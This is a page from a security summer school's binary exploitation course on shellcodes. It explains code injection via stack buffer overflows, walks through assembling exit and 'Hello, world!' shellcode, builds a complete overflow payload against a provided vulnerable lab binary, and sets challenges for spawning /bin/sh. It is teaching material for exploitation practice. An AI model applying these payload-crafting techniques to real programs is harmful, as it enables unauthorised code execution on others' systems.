target=_blank rel=noopener><i class="fa fa-file-alt fa-fw"></i> View page source</a>
<a href=https://github.com/security-summer-school/security-summer-school.github.io/edit/main/content/en/binary/shellcodes/index.md class=td-page-meta--edit target=_blank rel=noopener><i class="fa fa-edit fa-fw"></i> Edit this page</a>
<a href="https://github.com/security-summer-school/security-summer-school.github.io/new/main/content/en/binary/shellcodes/index.md?filename=change-me.md&value=---%0Atitle%3A+%22Long+Page+Title%22%0AlinkTitle%3A+%22Short+Nav+Title%22%0Aweight%3A+100%0Adescription%3A+%3E-%0A+++++Page+description+for+heading+and+indexes.%0A---%0A%0A%23%23+Heading%0A%0AEdit+this+template+to+create+your+new+page.%0A%0A%2A+Give+it+a+good+name%2C+ending+in+%60.md%60+-+e.g.+%60getting-started.md%60%0A%2A+Edit+the+%22front+matter%22+section+at+the+top+of+the+page+%28weight+controls+how+its+ordered+amongst+other+pages+in+the+same+directory%3B+lowest+number+first%29.%0A%2A+Add+a+good+commit+message+at+the+bottom+of+the+page+%28%3C80+characters%3B+use+the+extended+description+field+for+more+detail%29.%0A%2A+Create+a+new+branch+so+you+can+preview+your+new+file+and+request+a+review+via+Pull+Request.%0A" class=td-page-meta--child target=_blank rel=noopener><i class="fa fa-edit fa-fw"></i> Create child page</a>
<a href="https://github.com/security-summer-school/security-summer-school.github.io/issues/new?title=" class=td-page-meta--issue target=_blank rel=noopener><i class="fas fa-tasks fa-fw"></i> Create documentation issue</a>
<a href=https://github.com/security-summer-school/issues/new class=td-page-meta--project-issue target=_blank rel=noopener><i class="fas fa-tasks fa-fw"></i> Create project issue</a>
<a id=print href=/binary/_print/><i class="fa fa-print fa-fw"></i> Print entire section</a></div><div class=td-toc><nav id=TableOfContents><ul><li><a href=#stack-buffer-overflow-recap>Stack-buffer-overflow recap</a></li><li><a href=#code-injection>Code injection</a><ul><li><a href=#develop>Develop</a></li><li><a href=#inject>Inject</a></li><li><a href=#trigger>Trigger</a></li></ul></li><li><a href=#shellcodes>&ldquo;Shellcodes&rdquo;</a></li></ul><ul><li><a href=#01-tutorial-generating-machine-code>01. Tutorial: generating machine code</a></li><li><a href=#02-tutorial-inspecting-machine-code>02. Tutorial: inspecting machine code</a></li><li><a href=#03-tutorial-feeding-machine-code-to-a-program>03. Tutorial: feeding machine code to a program</a></li><li><a href=#04-tutorial-hello-world-shellcode>04. Tutorial: &ldquo;Hello, world!&rdquo; shellcode</a></li><li><a href=#05-tutorial-debugging-shellcodes>05. Tutorial: Debugging shellcodes</a></li></ul><ul><li><a href=#06-challenge-binsh-shellcode>06. Challenge: /bin/sh shellcode</a></li><li><a href=#07-challenge-shellcode-on-stack>07. Challenge: shellcode on stack</a></li><li><a href=#08-challenge-shellcode-after-saved-ret>08. Challenge: shellcode after saved ret</a></li><li><a href=#09-challenge-shellcode-after-saved-ret---no-leak>09. Challenge: shellcode after saved ret - no leak</a></li><li><a href=#10-challenge-shellcode-as-command-line-arg>10. Challenge: shellcode as command line arg</a></li><li><a href=#11-challenge-shellcode-in-the-environment>11. Challenge: shellcode in the environment</a></li></ul></nav></div></aside><main class="col-12 col-md-9 col-xl-8 pl-md-5" role=main><nav aria-label=breadcrumb class=td-breadcrumbs><ol class=breadcrumb><li class=breadcrumb-item><a href=/binary/>Binary Exploitation</a></li><li class="breadcrumb-item active" aria-current=page><a href=/binary/shellcodes/ aria-disabled=true class="btn-link disabled">Shellcodes</a></li></ol></nav><div class=td-content><h1></h1><header class=article-meta></header><details open><summary>Table of contents</summary><ul><li><a href=#introduction>Introduction</a><ul><li><a href=#stack-buffer-overflow-recap>Stack-buffer-overflow recap</a></li><li><a href=#code-injection>Code injection</a><ul><li><a href=#develop>Develop</a></li><li><a href=#inject>Inject</a></li><li><a href=#trigger>Trigger</a></li></ul></li><li><a href=#shellcodes>&ldquo;Shellcodes&rdquo;</a></li></ul></li><li><a href=#tutorials>Tutorials</a><ul><li><a href=#01-tutorial-generating-machine-code>01. Tutorial: generating machine code</a></li><li><a href=#02-tutorial-inspecting-machine-code>02. Tutorial: inspecting machine code</a></li><li><a href=#03-tutorial-feeding-machine-code-to-a-program>03. Tutorial: feeding machine code to a program</a></li><li><a href=#04-tutorial-hello-world-shellcode>04. Tutorial: &ldquo;Hello, world!&rdquo; shellcode</a></li><li><a href=#05-tutorial-debugging-shellcodes>05. Tutorial: Debugging shellcodes</a></li></ul></li><li><a href=#challenges>Challenges</a><ul><li><a href=#06-challenge-binsh-shellcode>06. Challenge: /bin/sh shellcode</a></li><li><a href=#07-challenge-shellcode-on-stack>07. Challenge: shellcode on stack</a></li><li><a href=#08-challenge-shellcode-after-saved-ret>08. Challenge: shellcode after saved ret</a></li><li><a href=#09-challenge-shellcode-after-saved-ret---no-leak>09. Challenge: shellcode after saved ret - no leak</a></li><li><a href=#10-challenge-shellcode-as-command-line-arg>10. Challenge: shellcode as command line arg</a></li><li><a href=#11-challenge-shellcode-in-the-environment>11. Challenge: shellcode in the environment</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li><li><a href=#resources>Resources</a></li></ul></details><h1 id=introduction>Introduction</h1><h2 id=stack-buffer-overflow-recap>Stack-buffer-overflow recap</h2><p>In the last session, we studied what an attacker can do to a program with a stack-buffer-overflow vulnerability: fill up the legitimately reserved space with junk, then overwrite the saved-return value with an address of their choosing. After the vulnerable function&rsquo;s execution ends, its final <code>ret</code> will place the attacker&rsquo;s chosen address into the <code>eip</code>/<code>rip</code> and execution will continue from there.</p><img src=./assets/stack_buffer.png width=600><p>The above scenario limits the attacker to the functionality already present in the vulnerable program. If an attacker desires to spawn a shell, but no shell-spawning code is already present - tough luck! In this session we will start studying a method of overcoming this limitation: code injection.</p><h2 id=code-injection>Code injection</h2><p>If the code we want to execute is not present in the target program, we&rsquo;ll simply add it ourselves! We will implement our desired functionality in machine code, inject (which is just a fancy word for &ldquo;write&rdquo;) it into the target process&rsquo; memory, then force execution to jump to the beginning of our code. These steps can be succinctly summarized as: develop, inject, trigger.</p><h3 id=develop>Develop</h3><p>First, we need to implement our desired functionality. Our goal is to obtain <em>something</em> that can be placed directly into the memory space of a running process and be executed; so it cannot be text representing code in C, Python, Java etc. It must be <em>machine code</em>. This might seem a very difficult task, but we&rsquo;ll simply use the tools we usually employ when writing code that we intend to run; in particular, we will rely on the assembler: we write ASM code to do what we want, then assemble it to obtain a string of machine code bytes.</p><h3 id=inject>Inject</h3><p>Once we have our string of machine code bytes, we need it to be present in the memory space of the target process. This means the program must read some input (with a <code>gets</code>, <code>fgets</code>, <code>fscanf</code>, <code>read</code> etc.). However, if we can <em>launch</em> the program, we can also place our code in the environment or inside a command line argument; even if a program doesn&rsquo;t use these, the loader still places them in its address space.</p><h3 id=trigger>Trigger</h3><p>After having placed our code inside the memory space of the target process, we need to force execution to jump at its beginning. We already know how to do this, by means of a stack-buffer-overflow, which we studied in the previous session.</p><h2 id=shellcodes>&ldquo;Shellcodes&rdquo;</h2><p>Usually, the end-goal of an attacker is to force the program to spawn a shell, thus gaining unlimited access. This can be achieved by injecting machine code that triggers an <code>execve("/bin/sh", ["/bin/sh", NULL], NULL)</code> system call, hence the name &ldquo;shellcode&rdquo;. However, this label is also used for any piece of injected code, even if it does not spawn a shell.</p><h1 id=tutorials>Tutorials</h1><h2 id=01-tutorial-generating-machine-code>01. Tutorial: generating machine code</h2><p>To address the first step of our code injection technique, we will start with a simple example: we want to force the program to end cleanly with an exit code of 42; more precisely we want to execute an <code>exit(42)</code> system call.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#204a87;font-weight:700>BITS</span> <span style=color:#0000cf;font-weight:700>64</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rdi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>42</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>60</span>
</span></span><span style=display:flex><span>    <span style=color:#000>syscall</span>
</span></span></code></pre></div><p><a href=http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>Linux Syscall Table</a></p><p>We can then use <code>nasm</code> to obtain a file with machine code:</p><pre tabindex=0><code>$ nasm exit_shellcode.nasm -o exit_shellcode.bin
</code></pre><p><strong>NOTE:</strong> <code>exit_shellcode.bin</code> is not an ELF:</p><pre tabindex=0><code>$ file exit_shellcode.bin
exit_shellcode.bin: data
</code></pre><p>It is not an executable file at all, but simply contains a raw string of machine code bytes. You can see that it is very, very small:</p><pre tabindex=0><code>$ wc --bytes exit_shellcode.bin
12 exit_shellcode.bin
</code></pre><h2 id=02-tutorial-inspecting-machine-code>02. Tutorial: inspecting machine code</h2><p>We would also like to be able to do the reverse of this: given a file that contains a raw string of machine code bytes, translate it back into readable assembly. This is useful to check that our assembly process was correct, as well as for analyzing files that we did not create.</p><p>In <a href=../exploration-tools>the first session</a>, we learned to disassemble using <code>objdump</code>. By default, <code>objdump</code> expects a proper <code>ELF</code> executable and complains about our raw file:</p><pre tabindex=0><code>$ objdump -d -M intel exit_shellcode.bin
objdump: exit_shellcode.bin: file format not recognized
</code></pre><p>We need to use the following command:</p><pre tabindex=0><code>$ objdump -D -b binary -m i386:x86-64 -M intel exit_shellcode.bin

test.bin:     file format binary


Disassembly of section .data:

0000000000000000 &lt;.data&gt;:
   0:   48 c7 c0 ff ff ff ff    mov    rax,0xffffffffffffffff
   7:   bf 2a 00 00 00          mov    edi,0x2a
   c:   b8 3c 00 00 00          mov    eax,0x3c
  11:   0f 05                   syscall
</code></pre><ul><li><code>-D</code>: disassemble all, not only text/code zones. In our case this means disassemble the whole file.</li><li><code>-b binary</code>: treat the file as not having a specific object/executable format (such as ELF, COFF, Mach-O or PE).</li><li><code>-m i386:86-64</code>: the machine code inside the binary file is i386 (x86), 64 bits (usually, <code>objdump</code> gets this information from the ELF header).</li><li><code>-M intel</code>: display ASM using Intel assembly syntax, as opposed to AT&T assembly syntax.</li></ul><p>We can also use a tool like <code>xxd</code> or <code>hexdump</code> to inspect the byte values in the file, without disassembling:</p><pre tabindex=0><code>$ xxd exit_shellcode.bin
00000000: 48c7 c0ff ffff ffbf 2a00 0000 b83c 0000  H.......*....&lt;..
00000010: 000f 05                                  ...
</code></pre><h2 id=03-tutorial-feeding-machine-code-to-a-program>03. Tutorial: feeding machine code to a program</h2><p>Now that we know how to obtain a bytestring of machine code from an assembly program, it&rsquo;s time to move on to the next step: injection. The simplest way is to redirect the <code>stdin</code> of the target program to the file containing our raw machine code.</p><pre tabindex=0><code>$ ./vuln &lt; exit_shellcode.bin
</code></pre><p>However, we might want to freely edit the payload directly on the command line (for example, if the program reads some other stuff). The way to do this is to use another tool, like the shell itself, to transform hexadecimal notation into binary data:</p><pre tabindex=0><code>$ printf &#39;\x4b\x80\x04\x08&#39;
K�
</code></pre><p>Again, we can use a tool like <code>xxd</code> for the reverse operation, to verify that the binary data comes out as intended:</p><pre tabindex=0><code>$ printf &#39;\x4b\x80\x04\x08&#39; | xxd -p
4b800408
</code></pre><p>If our machine code is contained in a file, we can use <code>hexdump</code> to obtain an escaped hexadecimal representation of its contents:</p><pre tabindex=0><code>$ hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; exit_shellcode.bin
\x48\xc7\xc0\xff\xff\xff\xff\xbf\x2a\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05
</code></pre><p>Which we can then combine with some other input</p><pre tabindex=0><code>$ printf &#39;1\x48\xc7\xc0\xff\xff\xff\xff\xbf\x2a\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05&#39; | ./vuln2
</code></pre><p>Or we can do this directly:</p><pre tabindex=0><code>$ printf &#39;1&#39;$(hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; exit_shellcode.bin) | ./vuln2
</code></pre><p>We can then verify that the program did indeed exit with code 42:</p><pre tabindex=0><code>$ echo $?
42
</code></pre><h2 id=04-tutorial-hello-world-shellcode>04. Tutorial: &ldquo;Hello, world!&rdquo; shellcode</h2><p>Our aim now is to develop a shellcode that prints <code>"Hello, world!\n"</code> to stdout, then inject it into <code>vuln</code> and trigger its execution.</p><p>We start by writing a shellcode that does a <code>write(1, "Hello, world!\n", 14)</code> system call, by writing the string on to the stack such that the stack pointer points to the beginning of the string.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#8f5902;font-style:italic>; Write &#34;Hello, world!\n&#34; to the standard output.</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>BITS</span> <span style=color:#0000cf;font-weight:700>64</span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>; We can&#39;t push 64 bit constants, but we can push 64 bit registers.</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rbx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>`orld!\n`</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#204a87>rbx</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rbx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>`Hello, w`</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#204a87>rbx</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rsi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#204a87>rsp</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rdx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>14</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rdi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span>
</span></span><span style=display:flex><span>    <span style=color:#000>syscall</span>
</span></span></code></pre></div><p>This is just one way to do it and there are other possible approaches to it.</p><p>We then assemble our snippet to get a string of machine code bytes (the <code>Makefile</code> provided already does this).</p><pre tabindex=0><code>$ nasm hello_shellcode.nasm -o hello_shellcode.bin
</code></pre><p>Our vulnerable program first reads 128 bytes into a global buffer (line 8):</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>machine_code</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>128</span><span style=color:#000;font-weight:700>);</span>
</span></span></code></pre></div><p>Our shellcode-injecting payload needs to consist of the shellcode itself and some junk to pad the payload length to 128. First, we need to determine the shellcode size in bytes, then we use a tool like python to generate the string:</p><pre tabindex=0><code>$ wc -c hello_shellcode.bin
42 hello_shellcode.bin

$ perl -e &#34;print \&#34;$(hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; ./hello_shellcode.bin)\&#34; . \&#34;A\&#34; x (128 - 42)&#34;
</code></pre><p>We then move on to the second part of our exploit, in which we hijack control flow by exploiting a stack-buffer-overflow in which 128 bytes are read into a 16 byte buffer.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>16</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>...</span>
</span></span><span style=display:flex><span><span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>128</span><span style=color:#000;font-weight:700>);</span>
</span></span></code></pre></div><p>All we need to do is to pad the legitimately reserved space until the saved return address, then overwrite it with the address of <code>machine_code</code>. Thus we will probably need 16 + 8 (the saved <code>rbp</code>) bytes of padding, but remember that we can&rsquo;t rely on the layout we see in C and must inspect the binary:</p><pre tabindex=0><code>$ objdump -d -M intel ./vuln
...
0000000000401126 &lt;main&gt;:
  401126:       55                      push   rbp
  401127:       48 89 e5                mov    rbp,rsp
  40112a:       48 83 ec 10             sub    rsp,0x10    &lt;---- Here we see that there are, indeed, just 16 bytes reserved on this stack frame
...
</code></pre><p>We then determine the address of the global buffer which holds our code and craft our second payload (remember to reverse the bytes because our systems are little endian):</p><pre tabindex=0><code>$ nm ./vuln | grep machine_code
0000000000404060 T machine_code

$ perl -e &#39;print &#34;A&#34; x (16 + 8) . &#34;\x60\x40\x40\x00\x00\x00\x00\x00&#34;&#39;
</code></pre><p>Now all we need to do is concatenate our two payloads:</p><pre tabindex=0><code>$ perl -e &#34;print \&#34;$(hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; ./hello_shellcode.bin)\&#34; . \&#34;A\&#34; x (128 - 42) . \&#34;A\&#34; x (16 + 8) . \&#34;\x60\x40\x40\x00\x00\x00\x00\x00\&#34;&#34; | ./vuln
Hello, world!
[1]    53760 done                              perl -e  |
       53762 segmentation fault (core dumped)  ./vuln
</code></pre><p>As you can see, even with simple exploits, payloads quickly become unwieldy. Our advice is to make use of a script in a language like python. There is one such script example in the task directory.</p><p>Even though we succeeded in printing our message, the program then ended abruptly with a <em>Segmentation fault</em>. Pause for a second to figure out why that is.</p><details><summary>Answer here</summary><p>Because we hijacked normal control flow, the program does not reach the end of the <code>main</code> function to terminate gracefully, but instead continues to attempt to execute instructions from the <code>machine_code</code> global var. We can help the program exit gracefully by extending our shellcode to also perform an <code>exit(0)</code> syscall after the <code>write</code>. Remember to check the size of the new shellcode and update the padding accordingly!</p></details><h2 id=05-tutorial-debugging-shellcodes>05. Tutorial: Debugging shellcodes</h2><p>How can we <strong>know</strong> that our shellcode worked properly? Sometimes its external effects are not immediately visible; if it involves any system calls, we can make use of <code>strace</code>:</p><pre tabindex=0><code>$ printf &#39;1&#39;$(hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; exit_shellcode.bin) | strace ./vuln2
execve(&#34;./vuln2&#34;, [&#34;./vuln2&#34;], 0x7ffdb027a9d0 /* 77 vars */) = 0
....
exit(42)                                = ?
+++ exited with 42 +++
</code></pre><p>A more productive approach is to use <code>gdb</code> to inspect the execution of the shellcode step by step. Load the program, break on the shellcode address, feed it the input and run:</p><details><summary>GDB output</summary><pre tabindex=0><code>$ gdb ./vuln
Reading symbols from ./vuln...
gdb-peda$ b *main+56
Breakpoint 1 at 0x40115e: file vuln.c, line 11.
gdb-peda$ r &lt; payload
Starting program: /home/mihai/gits/sss-exploit-internal/sessions/07-shellcodes/activities/04-tutorial-hello-world-shellcode/src/vuln &lt; payload
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x401160 (&lt;__libc_csu_init&gt;:       endbr64)
RCX: 0x7ffff7eb6052 (&lt;read+18&gt;: cmp    rax,0xfffffffffffff000)
RDX: 0x80
RSI: 0x7fffffffd370 (&#39;A&#39; &lt;repeats 24 times&gt;, &#34;`@@&#34;)
RDI: 0x0
RBP: 0x4141414141414141 (&#39;AAAAAAAA&#39;)
RSP: 0x7fffffffd388 --&gt; 0x404060 --&gt; 0xa21646c726fbb48
RIP: 0x40115e (&lt;main+56&gt;:       ret)
R8 : 0x0
R9 : 0x7ffff7fdc070 (&lt;_dl_fini&gt;:        endbr64)
R10: 0xfffffffffffff4ac
R11: 0x246
R12: 0x401040 (&lt;_start&gt;:        endbr64)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401153 &lt;main+45&gt;:  call   0x401030 &lt;read@plt&gt;
   0x401158 &lt;main+50&gt;:  mov    eax,0x0
   0x40115d &lt;main+55&gt;:  leave
=&gt; 0x40115e &lt;main+56&gt;:  ret
   0x40115f:    nop
   0x401160 &lt;__libc_csu_init&gt;:  endbr64
   0x401164 &lt;__libc_csu_init+4&gt;:        push   r15
   0x401166 &lt;__libc_csu_init+6&gt;:        lea    r15,[rip+0x2c93]        # 0x403e00
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd388 --&gt; 0x404060 --&gt; 0xa21646c726fbb48
0008| 0x7fffffffd390 --&gt; 0x7fffffffd40a --&gt; 0xd478000000000000
0016| 0x7fffffffd398 --&gt; 0x1f7fca000
0024| 0x7fffffffd3a0 --&gt; 0x401126 (&lt;main&gt;:      push   rbp)
0032| 0x7fffffffd3a8 --&gt; 0x7fffffffd859 --&gt; 0x54bcc0a1225a8900
0040| 0x7fffffffd3b0 --&gt; 0x401160 (&lt;__libc_csu_init&gt;:   endbr64)
0048| 0x7fffffffd3b8 --&gt; 0x352575cde5bb22d8
0056| 0x7fffffffd3c0 --&gt; 0x401040 (&lt;_start&gt;:    endbr64)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040115e in main () at vuln.c:11
11      }
gdb-peda$ si
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x401160 (&lt;__libc_csu_init&gt;:       endbr64)
RCX: 0x7ffff7eb6052 (&lt;read+18&gt;: cmp    rax,0xfffffffffffff000)
RDX: 0x80
RSI: 0x7fffffffd370 (&#39;A&#39; &lt;repeats 24 times&gt;, &#34;`@@&#34;)
RDI: 0x0
RBP: 0x4141414141414141 (&#39;AAAAAAAA&#39;)
RSP: 0x7fffffffd390 --&gt; 0x7fffffffd40a --&gt; 0xd478000000000000
RIP: 0x404060 --&gt; 0xa21646c726fbb48
R8 : 0x0
R9 : 0x7ffff7fdc070 (&lt;_dl_fini&gt;:        endbr64)
R10: 0xfffffffffffff4ac
R11: 0x246
R12: 0x401040 (&lt;_start&gt;:        endbr64)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40405a:    add    BYTE PTR [rax],al
   0x40405c:    add    BYTE PTR [rax],al
   0x40405e:    add    BYTE PTR [rax],al
=&gt; 0x404060 &lt;machine_code&gt;:     movabs rbx,0xa21646c726f
   0x40406a &lt;machine_code+10&gt;:  push   rbx
   0x40406b &lt;machine_code+11&gt;:  movabs rbx,0x77202c6f6c6c6548
   0x404075 &lt;machine_code+21&gt;:  push   rbx
   0x404076 &lt;machine_code+22&gt;:  mov    rsi,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd390 --&gt; 0x7fffffffd40a --&gt; 0xd478000000000000
0008| 0x7fffffffd398 --&gt; 0x1f7fca000
0016| 0x7fffffffd3a0 --&gt; 0x401126 (&lt;main&gt;:      push   rbp)
0024| 0x7fffffffd3a8 --&gt; 0x7fffffffd859 --&gt; 0x54bcc0a1225a8900
0032| 0x7fffffffd3b0 --&gt; 0x401160 (&lt;__libc_csu_init&gt;:   endbr64)
0040| 0x7fffffffd3b8 --&gt; 0x352575cde5bb22d8
0048| 0x7fffffffd3c0 --&gt; 0x401040 (&lt;_start&gt;:    endbr64)
0056| 0x7fffffffd3c8 --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000404060 in machine_code ()
gdb-peda$
</code></pre></details><h1 id=challenges>Challenges</h1><h2 id=06-challenge-binsh-shellcode>06. Challenge: /bin/sh shellcode</h2><p>You are given a piece of assembly code that attempts to spawn a shell with the aid of the <code>execve</code> syscall. However, the given code is buggy and it will not work. Your task is to figure out what&rsquo;s wrong with it and fix it.</p><h2 id=07-challenge-shellcode-on-stack>07. Challenge: shellcode on stack</h2><p>Up until now we have injected code into some memory area, then used a stack-buffer-overflow vulnerability to overwrite a saved return address and hijack control flow. If we think about it, the legitimately reserved buffer space on the stack <em>is</em> a memory area and we could perform our attack using a single read: the overflowing one.</p><p>So our payload will consist of the bytes in our shellcode, then some junk to pad the rest of the space to the saved return, then the address of the buffer itself:</p><img src=./assets/shellcode_below.png width=600><p>Now that our shellcode is written on the stack, things become a little harder. Due to several factors (such as the fact that environment variables and command line arguments are placed by the loader on the stack), it is difficult to predict the address at which any value will be placed on the stack. For now, the binary will generously print it for us.</p><p>You can observe the volatility of the stack by changing how you launch the program (rember that the path of the binary is considered a command line argument, namely <code>argv[0]</code> so it too gets placed on the stack, thus things change depending on what exact relative or absolute path we use):</p><pre tabindex=0><code>$ ./vuln
0x7fffffffd5d0
$ ../07-challenge-shellcode-on-stack/vuln
0x7fffffffd550
$ ./vuln asdf
0x7fffffffd5c0
$ ./vuln asdfqwer
0x7fffffffd5c0
$ ./vuln asdfqwerasdfqwer
0x7fffffffd5b0
$ ./vuln asdf qwer
0x7fffffffd5b0
$ FOO=bar ./vuln
0x7fffffffd5c0
</code></pre><h2 id=08-challenge-shellcode-after-saved-ret>08. Challenge: shellcode after saved ret</h2><p>In the previous challenge, we placed our shellcode on the stack, in the space between the overflown buffer&rsquo;s beginning and the saved return address. However, we could switch things up and place the shellcode in the area <em>after</em> the saved return address. This might be useful when the stack buffer is too short to hold our payload.</p><p>So our payload will consist of padding junk from the beginning of the buffer to the saved return, the address of the next stack portion, then the bytes of our shellcode.</p><img src=./assets/shellcode_above.png width=600><p>To recap: given a stack-buffer-overflow vulnerability we can not only hijack control flow, but also place a shellcode on the stack using the buggy read. There are two regions where we can do this:</p><ul><li>between the buffer start and the saved return. The number of bytes we can write here is determined by <em>how much space was allocated on the stack</em>.</li><li>after the saved return. The number of bytes we can write here is determined by <em>how many bytes are read</em>.</li></ul><p>If any of these regions is too small, we can try the other one. If both of them are too small, that&rsquo;s a problem. However, note that shellcodes are usually tiny.</p><h2 id=09-challenge-shellcode-after-saved-ret---no-leak>09. Challenge: shellcode after saved ret - no leak</h2><p>This is the same as the previous challenge, only this time the executable does not conveniently leak the buffer&rsquo;s address. So you will have to deal with the differences between running a binary inside and outside of <code>gdb</code> to precisely determine the necessary address, then jump to it.</p><h2 id=10-challenge-shellcode-as-command-line-arg>10. Challenge: shellcode as command line arg</h2><p>As mentioned in the introduction, reading from stdin or from a file isn&rsquo;t the only way to place content inside the memory space of a process. If we can launch the executable, we can modify its environment or command line arguments. The fact that a program might not use its arguments or environment is irrelevant, the loader can&rsquo;t know this, so it places them in the address space anyway.</p><p>Take the <code>/bin/sh</code> shellcode and feed it to the program as a command-line argument, then exploit the SBO to actually run it.</p><h2 id=11-challenge-shellcode-in-the-environment>11. Challenge: shellcode in the environment</h2><p>Take the <code>/bin/sh</code> shellcode and place it in the environment, then exploit the SBO to actually run it.</p><h1 id=further-reading>Further Reading</h1><p><a href=http://phrack.org/issues/49/14.html>&ldquo;Smashing The Stack For Fun And Profit&rdquo;, Aleph One</a> - a legendary attack paper documenting SBOs and shellcodes. As it is written in &lsquo;96, the examples in it will probably <em>not</em> work (either out-of-the-box or with some tweaks). We recommend perusing it for its historical/cultural significance, but don&rsquo;t waste much time on the technical details of the examples.</p><h1 id=resources>Resources</h1><p><a href=http://shell-storm.org/shellcode/>Shell-storm</a> - a repository of shellcodes.</p><style>.feedback--answer{display:inline-block}.feedback--answer-no{margin-left:1em}.feedback--response{display:none;margin-top:1em}.feedback--response__visible{display:block}</style><div class=d-print-none><h2 class=feedback--title>Feedback</h2><p class=feedback--question>Was this page helpful?</p><button class="btn btn-primary mb-4 feedback--answer feedback--answer-yes">Yes</button>
<button class="btn btn-primary mb-4 feedback--answer feedback--answer-no">No</button><p class="feedback--response feedback--response-yes">Glad to hear it! Please <a href=https://github.com/security-summer-school/security-summer-school.github.io/issues/new>tell us how we can improve</a>.</p><p class="feedback--response feedback--response-no">Sorry to hear that. Please <a href=https://github.com/security-summer-school/security-summer-school.github.io/issues/new>tell us how we can improve</a>.</p></div><script>const yesButton=document.querySelector(".feedback--answer-yes"),noButton=document.querySelector(".feedback--answer-no"),yesResponse=document.querySelector(".feedback--response-yes"),noResponse=document.querySelector(".feedback--response-no"),disableButtons=()=>{yesButton.disabled=!0,noButton.disabled=!0},sendFeedback=e=>{if(typeof ga!="function")return;const t={command:"send",hitType:"event",category:"Helpful",action:"click",label:window.location.pathname,value:e};ga(t.command,t.hitType,t.category,t.action,t.label,t.value)};yesButton.addEventListener("click",()=>{yesResponse.classList.add("feedback--response__visible"),disableButtons(),sendFeedback(1)}),noButton.addEventListener("click",()=>{noResponse.classList.add("feedback--response__visible"),disableButtons(),sendFeedback(0)})</script><br></div></main></div></div><footer class="bg-dark py-5 row d-print-none"><div class="container-fluid mx-sm-5"><div class=row><div class="col-6 col-sm-4 text-xs-center order-sm-2"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Discord aria-label=Discord><a class=text-white target=_blank rel=noopener href=https://bit.ly/DiscordSecuritySummerSchool aria-label=Discord><i class="fab fa-discord"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Facebook aria-label=Facebook><a class=text-white target=_blank rel=noopener href=https://www.facebook.com/SSSUPB/ aria-label=Facebook><i class="fab 